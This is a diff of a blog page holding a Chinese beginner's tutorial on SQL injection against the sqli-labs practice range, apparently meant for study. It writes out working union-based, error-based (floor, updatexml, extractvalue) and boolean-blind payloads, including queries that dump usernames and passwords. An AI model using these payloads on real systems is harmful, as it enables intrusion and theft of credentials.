+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sql注入的一些基操</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年2月8日 凌晨
+                
+              </p>
+            
+            <div class="markdown-body">
+              <!-- more -->
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次写博客0.0，梳理也记录一下自己学习的知识点，也方便日后复习叭。<br>如有错漏还请不吝指正ya<br>一些前置知识：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/7344548.html">Sqli-labs之sql注入基础知识</a></p>
 <h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><ul>
 <li>sql 注入：即通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</li>
 </ul>
 <ul>
-<li>sql注入漏洞的产生条件：<ol>
+<li><p>sql注入漏洞的产生条件：</p>
+<ol>
 <li>参数用户可控：前端传给后端的参数内容时用户可以控制的</li>
 <li>参数会被带入数据库查询：传入的参数会拼接到sql语句，并且带入数据库查询。</li>
 </ol>
 </li>
-<li>一满足以上两条件的PHP语句：<blockquote>
+<li><p>一满足以上两条件的PHP语句：</p>
+<blockquote>
 <p>$query = “SELECT * FROM users WHERE id = $_GET[ ‘id’ ] “;</p>
 </blockquote>
 </li>
@@ -80,12 +296,12 @@
 <ol>
 <li><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4></li>
 </ol>
-<p>用的是google chrome 的这款hackbar，UI界面挺简洁的（免费）<img src="https://img-blog.csdnimg.cn/20201026000612809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201026000457629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>不过使用时要注意<br>在注sqli-labs靶场的时候不删除选中的这一段会报错（还不明白为什么），就需要将图中蓝色这一段(submit=Subimt)删去再execute。<br>burpsubite中保持原样即可</p>
+<p>用的是google chrome 的这款hackbar，UI界面挺简洁的（免费）<img src="https://img-blog.csdnimg.cn/20201026000612809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201026000457629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>不过使用时要注意<br>在注sqli-labs靶场的时候不删除选中的这一段会报错（还不明白为什么），就需要将图中蓝色这一段(submit=Subimt)删去再execute。<br>burpsubite中保持原样即可</p>
 <ol start="2">
 <li><h4 id="burp-suite"><a href="#burp-suite" class="headerlink" title="burp suite"></a>burp suite</h4></li>
 </ol>
-<p>先抓包，丢去repeater，注入<br><img src="https://img-blog.csdnimg.cn/20201026001519181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"></p>
+<p>先抓包，丢去repeater，注入<br><img src="https://img-blog.csdnimg.cn/20201026001519181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h2 id="注释方式：-或–"><a href="#注释方式：-或–" class="headerlink" title="注释方式：#或–+"></a>注释方式：#或–+</h2><ul>
 <li><p>sql中的注释符为 <code>-- (空格)</code> 和 <code>#</code> 以及 <code>/* */</code><br>(多行注释 <code>/**/</code>为成对匹配，将 <code>/*</code> 和 <code>*/</code> 中的内容注释掉，可在注入时用于绕过过滤规则)<br><code>-- (空格)</code> ： sql中规定：–其后必须跟空格<br>(如果不加空格，– 会和系统自动生成的单引号连接在一起，被判定为关键词，无法注释掉系统自动生成的单引号)</p>
 </li>
@@ -125,70 +341,73 @@
 <p>eg:                              —(sqli-labs)–Less1<br>?id=1,正常回显<br> ?id=1 and 1=1 正常回显<br> ?id=1 and 1=2 正常回显<br>——————-判断为非数字型注入<br>?id=1’        变化/报错<br>?id=1’ –+        正常回显<br>——————-判断为字符型注入。闭合方式为单引号’ ’<br>—————————对不同闭合类型将 ‘ 改为对应闭合符号即可</p>
 </blockquote>
 <h2 id="判断字段数及回显位"><a href="#判断字段数及回显位" class="headerlink" title="判断字段数及回显位"></a>判断字段数及回显位</h2><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><blockquote>
-<p>eg:<br>?id=1’ order by 1 –+<br>?id=1’ order by 2 –+<br>?id=1’ order by 3 –+<br><img src="https://img-blog.csdnimg.cn/20201122010323880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_10,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>?id=1’ order by 4 –+<br><img src="https://img-blog.csdnimg.cn/20201122010435459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"></p>
+<p>eg:<br>?id=1’ order by 1 –+<br>?id=1’ order by 2 –+<br>?id=1’ order by 3 –+<br><img src="https://img-blog.csdnimg.cn/20201122010323880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_10,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>?id=1’ order by 4 –+<br><img src="https://img-blog.csdnimg.cn/20201122010435459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </blockquote>
 <p>说明字段数为3，</p>
 <h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><blockquote>
-<p>eg:<br>?id=-1’ union select 1,2,3 –+<br><img src="https://img-blog.csdnimg.cn/20201122010553263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"></p>
+<p>eg:<br>?id=-1’ union select 1,2,3 –+<br><img src="https://img-blog.csdnimg.cn/20201122010553263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </blockquote>
 <p>2,3为回显位，因此在2、3的位置插入语句即可。</p>
 <blockquote>
 <p>eg:<br>?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
 </blockquote>
-<h2 id="一库三表四字段"><a href="#一库三表四字段" class="headerlink" title="一库三表四字段"></a>一库三表四字段</h2><p>很多教程讲的很详细，这里不做赘述，挂个当时记的结构图<br><img src="https://img-blog.csdnimg.cn/20201122012406851.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>select schema_name from information_schema.schemata<br>select table_name from information_schema.tables where table_schema=’xxx’<br>select column_name from information_schema.columns where table_name=’xxx’<br>select group_concat(xxx) from xxx</p>
+<h2 id="一库三表四字段"><a href="#一库三表四字段" class="headerlink" title="一库三表四字段"></a>一库三表四字段</h2><p>很多教程讲的很详细，这里不做赘述，挂个当时记的结构图<br><img src="https://img-blog.csdnimg.cn/20201122012406851.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>select schema_name from information_schema.schemata<br>select table_name from information_schema.tables where table_schema=’xxx’<br>select column_name from information_schema.columns where table_name=’xxx’<br>select group_concat(xxx) from xxx</p>
 <h2 id="各种注入"><a href="#各种注入" class="headerlink" title="各种注入"></a>各种注入</h2><h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><ul>
 <li><p>适用：<code>页面有回显位的情况</code></p>
 </li>
 <li><p>当访问id=1 union selecet 1,2,3时，执行的sql语句为： <code>sql select * from users where &#39;id&#39;=1 union select 1,2,3 </code></p>
 <p>此时的sql语句可分为两条：</p>
 <ol>
-<li><code>select * from users where &#39;id&#39;=1</code></li>
-<li><code>union select 1,2,3</code><br>  此时利用第二条语句(Union查询)即可获取数据库中的数据</li>
+<li><p><code>select * from users where &#39;id&#39;=1</code></p>
+</li>
+<li><p><code>union select 1,2,3</code> </p>
+<p>  此时利用第二条语句(Union查询)即可获取数据库中的数据</p>
+</li>
 </ol>
 </li>
 </ul>
 <p>eg:sqli-labs——Less1  </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">--判断注入点类型 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>			#正常回显 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 	#正常回显 </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 	#正常回显</span><br><span class="line"><span class="comment">-------------------非数字型注入 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>’,报错 ?id<span class="operator">=</span><span class="number">1</span>’ <span class="comment">--+	#正常回显</span></span><br><span class="line"><span class="comment">-------------------字符型注入。闭合方式为单引号’ ’</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-comment">--判断注入点类型 </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>			#正常回显 <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> 	#正常回显 <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> 	#正常回显<br><span class="hljs-comment">-------------------非数字型注入 </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>’,报错 ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>’ <span class="hljs-comment">--+	#正常回显</span><br><span class="hljs-comment">-------------------字符型注入。闭合方式为单引号’ ’</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="comment">--爆段  </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 order by 1 --+ #正常 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> <span class="comment">--+ #正常 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 order by 3 --+ #空白 </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+ #报错(Unknow column ‘4’ in ‘order clause’)</span></span><br><span class="line"></span><br><span class="line">或 </span><br><span class="line"></span><br><span class="line">从 ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1--+		#报错 </span></span><br><span class="line"><span class="string">到 ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+  	#正常回显即可</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-comment">--爆段  </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 order by 1 --+ #正常 </span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> <span class="hljs-comment">--+ #正常 </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 order by 3 --+ #空白 </span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+ #报错(Unknow column ‘4’ in ‘order clause’)</span><br><br>或 <br><br>从 ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1--+		#报错 </span><br><span class="hljs-string">到 ?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+  	#正常回显即可</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span><span class="comment">--爆数据库 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database()--+ 得到数据库名security</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">3</span><span class="hljs-comment">--爆数据库 </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database()--+ 得到数据库名security</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span><span class="comment">--爆表 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ </span></span><br><span class="line"><span class="string">#得到表名：emails,referers,uagents,users</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">4</span><span class="hljs-comment">--爆表 </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ </span><br><span class="hljs-string">#得到表名：emails,referers,uagents,users</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span><span class="comment">--爆列名 </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+ </span></span><br><span class="line"><span class="string">得到列名 avatar,failed_login,....,USER,id,password,username</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">5</span><span class="hljs-comment">--爆列名 </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+ </span><br><span class="hljs-string">得到列名 avatar,failed_login,....,USER,id,password,username</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span><span class="operator">-</span>爆值 ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(username,0x2b,password) from users --+ </span></span><br><span class="line"><span class="string">得到：（+分隔账号密码） Dumb+Dumb,I-kill-you+Angelina,.....</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">6</span><span class="hljs-operator">-</span>爆值 ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(username,0x2b,password) from users --+ </span><br><span class="hljs-string">得到：（+分隔账号密码） Dumb+Dumb,I-kill-you+Angelina,.....</span><br></code></pre></td></tr></table></figure>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
 <li><p>适用：<code>页面中会显示SQL的报错信息 </code><br>但一般情况下SQL的报错信息是不会显示在页面中的，必须在在php.ini 进行配置<code>display_errors=On</code>   <em>–(开启PHP错误回显)</em>  </p>
 </li>
 <li><p>SQL报错信息被显示在页面上<br>(即通过 <code>echo mysqli_error($con)</code> 将错误信息输出到页面)</p>
 </li>
 </ul>
-<h4 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select count(*) from information_schema.tables group by concat((查询语句),floor(rand(0)*2))) --+</span></span><br></pre></td></tr></table></figure>
-<h4 id="updataxml函数"><a href="#updataxml函数" class="headerlink" title="updataxml函数"></a>updataxml函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select updatexml(1,concat(0x7e,(查询语句),0x7e),1))--+</span></span><br></pre></td></tr></table></figure>
-<h4 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select extractvalue(1,concat(0x7e,(查询语句),0x7e)))--+</span></span><br></pre></td></tr></table></figure>
+<h4 id="floor函数"><a href="#floor函数" class="headerlink" title="floor函数"></a>floor函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat((查询语句),floor(rand(0)*2))) --+</span><br></code></pre></td></tr></table></figure>
+<h4 id="updataxml函数"><a href="#updataxml函数" class="headerlink" title="updataxml函数"></a>updataxml函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select updatexml(1,concat(0x7e,(查询语句),0x7e),1))--+</span><br></code></pre></td></tr></table></figure>
+<h4 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select extractvalue(1,concat(0x7e,(查询语句),0x7e)))--+</span><br></code></pre></td></tr></table></figure>
 <h3 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h3><ul>
 <li>适用条件：<br><code>无查询结果、报错信息的回显，但页面会根据查询结果的正确与否变化的情况</code></li>
 <li>真实渗透中手动盲注与sqlmap比起来效率太低，实战中还是使用sqlmap，但一定要熟知原理</li>
 </ul>
 <p>-常用函数：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">截取</span><br><span class="line">substr()、<span class="built_in">substring</span>()、id():</span><br><span class="line"><span class="built_in">substring</span>()和mid()的用法和substr()一样，但是mid()是为了向下兼容VB6<span class="number">.0</span>，已经过时，以上的几个函数的pos都是从<span class="number">1</span>开始的</span><br><span class="line">eg:</span><br><span class="line">substr(string, pos, len): 从pos开始，取长度为len的子串</span><br><span class="line">substr(string, pos): 从pos开始，取到string的最后</span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span>()和<span class="keyword">right</span>():</span><br><span class="line"><span class="keyword">left</span>(string, len)和<span class="keyword">right</span>(string, len): 分别是从左或从右取string中长度为len的子串</span><br><span class="line">limit</span><br><span class="line">limit pos len: 在返回项中从pos开始去len个返回值，pos的从<span class="number">0</span>开始</span><br><span class="line"></span><br><span class="line">ascii()和<span class="type">char</span>()和ord():</span><br><span class="line">ascii(<span class="type">char</span>): 把<span class="type">char</span>这个字符转为ascii码</span><br><span class="line"><span class="type">char</span>(ascii_int): 和ascii()的作用相反，将ascii码转字符</span><br><span class="line">ord(str): 如果字符串str句首是单字节返回与ascii()函数返回的相同值。</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">截取<br>substr()、<span class="hljs-built_in">substring</span>()、id():<br><span class="hljs-built_in">substring</span>()和mid()的用法和substr()一样，但是mid()是为了向下兼容VB6<span class="hljs-number">.0</span>，已经过时，以上的几个函数的pos都是从<span class="hljs-number">1</span>开始的<br>eg:<br>substr(string, pos, len): 从pos开始，取长度为len的子串<br>substr(string, pos): 从pos开始，取到string的最后<br><br><span class="hljs-keyword">left</span>()和<span class="hljs-keyword">right</span>():<br><span class="hljs-keyword">left</span>(string, len)和<span class="hljs-keyword">right</span>(string, len): 分别是从左或从右取string中长度为len的子串<br>limit<br>limit pos len: 在返回项中从pos开始去len个返回值，pos的从<span class="hljs-number">0</span>开始<br><br>ascii()和<span class="hljs-type">char</span>()和ord():<br>ascii(<span class="hljs-type">char</span>): 把<span class="hljs-type">char</span>这个字符转为ascii码<br><span class="hljs-type">char</span>(ascii_int): 和ascii()的作用相反，将ascii码转字符<br>ord(str): 如果字符串str句首是单字节返回与ascii()函数返回的相同值。<br></code></pre></td></tr></table></figure>
 <p> eg:sqli-labs Less5</p>
 <ul>
 <li>（正确则回显，不正确则无回显）</li>
 <li>（可使用如left((select database()),1)&lt;’t’  这样的比较二分查找方法快速爆破）</li>
 </ul>
 <p>–爆库：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> database()),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 <p>–爆表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
 <p>–爆列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 4,1),8)=&#x27;</span>password<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 12,1),8)=&#x27;</span>username<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 4,1),8)=&#x27;</span>password<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
